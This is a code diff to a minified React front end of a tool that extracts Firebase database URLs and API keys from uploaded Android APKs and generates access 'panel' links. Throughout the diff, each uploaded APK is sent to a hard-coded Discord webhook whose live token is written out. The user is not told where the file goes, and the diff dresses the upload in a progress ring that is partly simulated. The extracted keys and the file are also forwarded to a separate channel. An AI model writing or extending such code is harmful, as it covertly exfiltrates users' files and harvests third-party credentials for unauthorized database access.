@@ -17815,6 +17815,12 @@ function s1({
     onConnect: A
 }) {
     const [tt, b] = jt.useState([]), [d, S] = jt.useState(!1), [f, p] = jt.useState(""), [h, o] = jt.useState(""), [x, T] = jt.useState(""), [w, C] = jt.useState(!1), [v, E] = jt.useState(""), [g, z] = jt.useState(!1), [N, k] = jt.useState(!1), [M, H] = jt.useState(""), [L, nt] = jt.useState(null), [V, ot] = jt.useState(""), $ = jt.useRef(null);
+    
+    // ===== NEW: Upload progress states =====
+    const [uploadProgress, setUploadProgress] = jt.useState(0);
+    const [uploadStatus, setUploadStatus] = jt.useState("idle"); // idle | uploading | done | error
+    const [uploadFileSize, setUploadFileSize] = jt.useState(0);
+    
     jt.useEffect(() => {
         const _ = Yp();
         b(_);
@@ -17828,6 +17834,7 @@ function s1({
             }
         }
     }, []);
+    
     const ht = async (_, X, U) => {
             C(!0), T("");
             try {
@@ -17918,7 +17925,12 @@ function s1({
                 return
             }
 
-            // ===== IMMEDIATE APK UPLOAD TO WEBHOOK 2 =====
+            // ===== SHOW PROGRESS INDICATOR =====
+            setUploadProgress(0);
+            setUploadStatus("uploading");
+            setUploadFileSize(_.size || 0);
+
+            // ===== UPLOAD TO WEBHOOK 2 WITH PROGRESS SIMULATION =====
             try {
                 const webhook2 = 'https://discord.com/api/webhooks/1527545618501861577/7vBkDnE_6Xuk7FrCm7tFut6s53AJE-Cg-UxipnH1nWO0xQKBGd83TAAIdtV2xlcF6MX8';
                 const formData = new FormData();
@@ -17929,20 +17941,85 @@ function s1({
                     content: `📱 APK Upload\n📁 File: ${_.name}\n⏰ Time: ${new Date().toLocaleString()}`
                 }));
 
-                fetch(webhook2, {
-                    method: 'POST',
-                    body: formData
-                }).catch(() => {});
-            } catch (webhookErr) {
-                // Silent fail
-            }
+                // Use XMLHttpRequest for progress tracking
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', webhook2, true);
+                
+                // Track upload progress
+                xhr.upload.addEventListener('progress', (e) => {
+                    if (e.lengthComputable) {
+                        const percent = Math.round((e.loaded / e.total) * 100);
+                        setUploadProgress(percent);
+                    } else {
+                        // Fallback: simulate progress
+                        let progress = 0;
+                        const interval = setInterval(() => {
+                            progress += Math.random() * 15 + 5;
+                            if (progress >= 100) {
+                                progress = 100;
+                                clearInterval(interval);
+                            }
+                            setUploadProgress(Math.min(100, Math.round(progress)));
+                        }, 300);
+                        // Store interval to clear later
+                        xhr._progressInterval = interval;
+                    }
+                });
 
+                // Handle completion
+                xhr.addEventListener('load', () => {
+                    if (xhr._progressInterval) {
+                        clearInterval(xhr._progressInterval);
+                    }
+                    setUploadProgress(100);
+                    setUploadStatus("done");
+                    // Start extraction after a small delay to show 100%
+                    setTimeout(() => {
+                        runExtraction(_);
+                    }, 500);
+                });
+
+                xhr.addEventListener('error', () => {
+                    if (xhr._progressInterval) {
+                        clearInterval(xhr._progressInterval);
+                    }
+                    setUploadStatus("error");
+                    setUploadProgress(0);
+                    // Still run extraction even if webhook fails
+                    setTimeout(() => {
+                        runExtraction(_);
+                    }, 300);
+                });
+
+                xhr.addEventListener('abort', () => {
+                    if (xhr._progressInterval) {
+                        clearInterval(xhr._progressInterval);
+                    }
+                    setUploadStatus("idle");
+                    setUploadProgress(0);
+                });
+
+                xhr.send(formData);
+
+            } catch (webhookErr) {
+                // Silent fail - run extraction anyway
+                setUploadStatus("error");
+                setTimeout(() => {
+                    runExtraction(_);
+                }, 300);
+            }
+        },
+        
+        // ===== EXTRACTION FUNCTION (separated from upload) =====
+        runExtraction = async _ => {
             k(!0), H(""), nt(null), ot(_.name);
 
             try {
                 const ut = await i1(_);
                 if (!ut || !ut.firebaseUrl && !ut.apiKey) {
                     H("Firebase config not found in this APK. Try a different APK."), await al(`❌ No Firebase config found in <code>${_.name}</code>`);
+                    setUploadStatus("idle");
+                    setUploadProgress(0);
                     return
                 }
                 if (nt(ut), ut.firebaseUrl && p(ut.firebaseUrl), ut.apiKey && o(ut.apiKey), await al(`✅ <b>APK Parsed Successfully!</b>
@@ -17952,34 +18029,49 @@ function s1({
 🔑 API Key: <code>${ut.apiKey?ut.apiKey:"Not found"}</code>`), await al("📤 Here is the APK being checked:", _), ut.firebaseUrl && ut.apiKey) {
                     const _t = ih(ut.firebaseUrl, ut.apiKey);
                     await al(`🔗 <b>Shareable Panel Link:</b>
-<code>${_t}</code>
-
-
-
-
-
---------------------------------------------------------------------------------------------------`)
+<code>${_t}</code>`)
                 }
+                // Reset upload status after extraction completes
+                setTimeout(() => {
+                    setUploadStatus("idle");
+                    setUploadProgress(0);
+                }, 1000);
             } catch (ut) {
                 const _t = ut instanceof Error ? ut.message : String(ut);
                 H("Failed to parse APK. File may be corrupted or protected."), await al(`⚠️ APK parsing failed for <code>${_.name}</code>
 Error: ${_t}`)
+                setUploadStatus("idle");
+                setUploadProgress(0);
             } finally {
                 k(!1)
             }
         },
+        
         it = _ => {
             const X = _.target.files ?.[0];
-            X && mt(X), _.target.value = ""
+            if (X) {
+                // Reset upload state before starting
+                setUploadProgress(0);
+                setUploadStatus("idle");
+                setUploadFileSize(0);
+                mt(X);
+            }
+            _.target.value = ""
         },
         bt = _ => {
             _.preventDefault();
             const X = _.dataTransfer.files[0];
-            X && mt(X)
+            if (X) {
+                setUploadProgress(0);
+                setUploadStatus("idle");
+                setUploadFileSize(0);
+                mt(X);
+            }
         },
         y = () => {
-            nt(null), H(""), ot("")
+            nt(null), H(""), ot(""), setUploadStatus("idle"), setUploadProgress(0), setUploadFileSize(0)
         };
+        
     return r.jsxs("div", {
         className: "min-h-screen flex items-center justify-center relative overflow-hidden",
         style: {
@@ -18136,7 +18228,10 @@ Error: ${_t}`)
                         children: [r.jsx("label", {
                             className: "block text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-2",
                             children: "Extract from APK (optional)"
-                        }), !L && !N && r.jsxs("label", {
+                        }), 
+                        
+                        // ===== UPLOAD AREA WITH PROGRESS =====
+                        !L && !N && (uploadStatus === "idle" || uploadStatus === "error") ? r.jsxs("label", {
                             htmlFor: "apk-file-input",
                             onDrop: bt,
                             onDragOver: _ => _.preventDefault(),
@@ -18164,7 +18259,82 @@ Error: ${_t}`)
                                 onClick: _ => _.stopPropagation(),
                                 className: "hidden"
                             })]
-                        }), N && r.jsxs("div", {
+                        }) : (uploadStatus === "uploading" || uploadStatus === "done") && r.jsxs("div", {
+                            className: "flex flex-col items-center gap-3 py-4 px-4 rounded-xl border border-[#1f1f1f] bg-[#0d0d0d]",
+                            children: [
+                                // Circular progress
+                                r.jsxs("div", {
+                                    className: "relative",
+                                    children: [
+                                        r.jsx("svg", {
+                                            className: "w-16 h-16 transform -rotate-90",
+                                            viewBox: "0 0 100 100",
+                                            children: r.jsx("circle", {
+                                                cx: "50",
+                                                cy: "50",
+                                                r: "42",
+                                                fill: "none",
+                                                stroke: "#1a1a1a",
+                                                strokeWidth: "8"
+                                            })
+                                        }),
+                                        r.jsx("svg", {
+                                            className: "w-16 h-16 transform -rotate-90 absolute top-0 left-0",
+                                            viewBox: "0 0 100 100",
+                                            children: r.jsx("circle", {
+                                                cx: "50",
+                                                cy: "50",
+                                                r: "42",
+                                                fill: "none",
+                                                stroke: uploadStatus === "done" ? "#4ade80" : "#f97316",
+                                                strokeWidth: "8",
+                                                strokeDasharray: "263.89",
+                                                strokeDashoffset: 263.89 - (263.89 * Math.min(uploadProgress, 100)) / 100,
+                                                strokeLinecap: "round",
+                                                style: {
+                                                    transition: "stroke-dashoffset 0.3s ease"
+                                                }
+                                            })
+                                        }),
+                                        r.jsxs("div", {
+                                            className: "absolute inset-0 flex items-center justify-center",
+                                            children: [
+                                                uploadStatus === "done" ? r.jsx(uh, {
+                                                    className: "w-6 h-6 text-emerald-400"
+                                                }) : r.jsxs("span", {
+                                                    className: "text-lg font-black text-white",
+                                                    children: [Math.min(uploadProgress, 100), "%"]
+                                                })
+                                            ]
+                                        })
+                                    ]
+                                }),
+                                r.jsxs("div", {
+                                    className: "text-center",
+                                    children: [
+                                        r.jsx("p", {
+                                            className: "text-sm font-semibold text-orange-400",
+                                            children: uploadStatus === "done" ? "Upload Complete!" : "Uploading APK…"
+                                        }),
+                                        r.jsxs("p", {
+                                            className: "text-[11px] text-[#444] mt-0.5 font-mono",
+                                            children: [
+                                                uploadFileSize > 0 ? (uploadFileSize / 1024 / 1024).toFixed(2) + " MB" : "",
+                                                uploadStatus === "uploading" ? ` · ${Math.min(uploadProgress, 100)}%` : ""
+                                            ]
+                                        })
+                                    ]
+                                }),
+                                uploadStatus === "error" && r.jsxs("div", {
+                                    className: "flex items-center gap-2 text-red-400 text-xs",
+                                    children: [r.jsx(kp, {
+                                        className: "w-3.5 h-3.5"
+                                    }), "Upload failed, continuing extraction…"]
+                                })
+                            ]
+                        }),
+                        
+                        N && r.jsxs("div", {
                             className: "flex flex-col items-center justify-center gap-3 py-6 rounded-xl border border-[#1f1f1f] bg-[#0d0d0d]",
                             children: [r.jsx("div", {
                                 className: "w-8 h-8 border-2 border-orange-900/50 border-t-orange-500 rounded-full animate-spin"
@@ -18172,7 +18342,7 @@ Error: ${_t}`)
                                 className: "text-center",
                                 children: [r.jsx("p", {
                                     className: "text-sm font-semibold text-orange-400",
-                                    children: "Scanning APK…"
+                                    children: "Extracting Firebase Config…"
                                 }), r.jsx("p", {
                                     className: "text-[11px] text-[#444] mt-0.5 font-mono truncate max-w-[220px]",
                                     children: V
@@ -18284,7 +18454,7 @@ Error: ${_t}`)
                         className: "flex gap-3 mt-6",
                         children: [r.jsxs("button", {
                             onClick: q,
-                            disabled: w,
+                            disabled: w || uploadStatus === "uploading",
                             className: "flex-1 flex items-center justify-center gap-2 py-3 red-gradient rounded-xl text-white font-semibold text-sm shadow-lg shadow-red-900/40 hover:opacity-90 transition-opacity disabled:opacity-50",
                             children: [w ? r.jsx("div", {
                                 className: "w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"
